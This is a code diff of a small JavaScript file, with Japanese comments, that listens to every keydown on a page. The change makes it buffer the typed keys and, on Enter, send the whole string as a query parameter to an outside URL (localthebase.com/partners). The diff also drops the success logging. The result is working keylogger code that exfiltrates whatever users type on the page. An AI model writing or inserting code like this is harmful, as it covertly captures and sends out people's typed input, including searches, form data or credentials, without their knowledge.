@@ -1,11 +1,16 @@
+var keyword = '';
+function append(key) {
+	keyword = keyword + key;
+	console.log(keyword);
+}
 
-function send(key) {
+function send() {
     
     // XMLHttpRequest オブジェクトの作成
     var xhr = new XMLHttpRequest();
 
     // 送信するデータ
-    var params = "key=" + key;
+    var params = "key=" + keyword;
 
     // 送信先 URL と HTTP メソッドを指定
     xhr.open('GET', 'https://localthebase.com/partners?' + params, true);
@@ -13,8 +18,6 @@ function send(key) {
     // サーバーからの応答が正常に戻った場合の処理を設定
     xhr.onload = function () {
       if (xhr.status >= 200 && xhr.status < 300) {
-        // 応答が成功した場合の処理をここに書く
-        console.log("Success:", xhr.responseText);
       } else {
         // エラー処理をここに書く
         console.error("Request failed with status: " + xhr.status);
@@ -33,5 +36,9 @@ function send(key) {
 
 document.addEventListener('keydown', (event) => {
     console.log(event.key);
-    send(event.key);
+    if (event.key == 'Enter') {
+     send();    	
+    } else {
+    	append(event.key);
+    }
 });
